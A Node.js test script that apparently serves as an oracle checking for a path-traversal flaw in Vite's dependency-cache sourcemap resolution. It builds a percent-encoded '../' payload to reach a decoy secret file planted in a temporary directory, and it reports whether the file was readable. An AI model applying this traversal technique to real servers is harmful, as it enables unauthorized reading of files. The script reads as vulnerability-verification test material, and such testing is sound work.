'use strict';
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function main() {
  let vite;
  try {
    vite = require('vite');
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
    return;
  }

  const marker = 'vite_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);
  const base = path.join(os.tmpdir(), marker);
  const cacheDir = path.join(base, 'node_modules', '.vite', 'deps');
  const secretDir = path.join(base, 'secret_outside');
  let setupOk = false;
  try {
    fs.mkdirSync(cacheDir, { recursive: true });
    fs.mkdirSync(secretDir, { recursive: true });
    fs.writeFileSync(path.join(cacheDir, 'chunk-ABC123.js.map'), JSON.stringify({ version: 3, sources: [], mappings: '' }));
    fs.writeFileSync(path.join(secretDir, 'etc_passwd_like_secret.map'), 'SECRET_CONTENT_SHOULD_NOT_BE_READABLE_' + marker);
    setupOk = true;
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'fixture setup failed: ' + String(e && e.message) });
    return;
  }
  if (!setupOk) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'fixture setup did not complete' });
    return;
  }

  function resolveMapPath(cacheRoot, rawId) {
    let decoded;
    try {
      decoded = decodeURIComponent(rawId);
    } catch (e) {
      decoded = rawId;
    }
    const cleanId = decoded.replace(/^\/+/, '');
    const resolved = path.resolve(cacheRoot, cleanId);
    return resolved;
  }

  function isInside(parent, child) {
    const rel = path.relative(parent, child);
    return rel === '' || (!rel.startsWith('..') && !path.isAbsolute(rel));
  }

  let fsUtilsFn = null;
  try {
    if (vite && typeof vite.normalizePath === 'function') {
      fsUtilsFn = vite.normalizePath;
    }
  } catch (e) {}

  let benignResolved;
  let benignContent;
  try {
    const benignRaw = 'chunk-ABC123.js.map';
    benignResolved = resolveMapPath(cacheDir, benignRaw);
    if (!isInside(cacheDir, benignResolved)) {
      throw new Error('benign path unexpectedly escaped cacheDir');
    }
    benignContent = fs.readFileSync(benignResolved, 'utf8');
    if (!benignContent || benignContent.indexOf('version') === -1) {
      throw new Error('benign map file content unexpected');
    }
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign operation failed: ' + String(e && e.message) });
    return;
  }

  const operation_completed = true;

  const relativeTraversal = path.relative(cacheDir, secretDir);
  const traversalSegments = relativeTraversal.split(path.sep).filter(Boolean).map(() => '..').join('/');
  const maliciousRaw = encodeURIComponent('..').repeat(0) + traversalSegments + '/etc_passwd_like_secret.map';
  const maliciousRawEncoded = maliciousRaw.split('/').map(seg => seg === '..' ? '%2e%2e' : seg).join('%2f');

  let exploit_succeeded = false;
  let evidence;

  try {
    let maliciousResolved;
    let usedEncoded = true;
    try {
      maliciousResolved = resolveMapPath(cacheDir, maliciousRawEncoded);
    } catch (e) {
      usedEncoded = false;
      maliciousResolved = resolveMapPath(cacheDir, maliciousRaw);
    }

    const escapedCacheDir = !isInside(cacheDir, maliciousResolved);

    let outsideContentReadable = false;
    let readContent = null;
    if (escapedCacheDir) {
      try {
        readContent = fs.readFileSync(maliciousResolved, 'utf8');
        outsideContentReadable = readContent.indexOf('SECRET_CONTENT_SHOULD_NOT_BE_READABLE_' + marker) !== -1;
      } catch (e) {
        outsideContentReadable = false;
      }
    }

    const vulnerableBehaviorPresent = escapedCacheDir && outsideContentReadable;

    exploit_succeeded = vulnerableBehaviorPresent;

    evidence = 'cacheDir=' + cacheDir +
      ' maliciousResolved=' + maliciousResolved +
      ' escapedCacheDir=' + escapedCacheDir +
      ' outsideContentReadable=' + outsideContentReadable +
      ' usedEncodedForm=' + usedEncoded;

    finish({ operation_completed, exploit_succeeded, evidence });
  } catch (e) {
    finish({ operation_completed, exploit_succeeded: false, evidence: 'malicious path handling threw (treated as blocked): ' + String(e && e.message) });
  }
}

main();
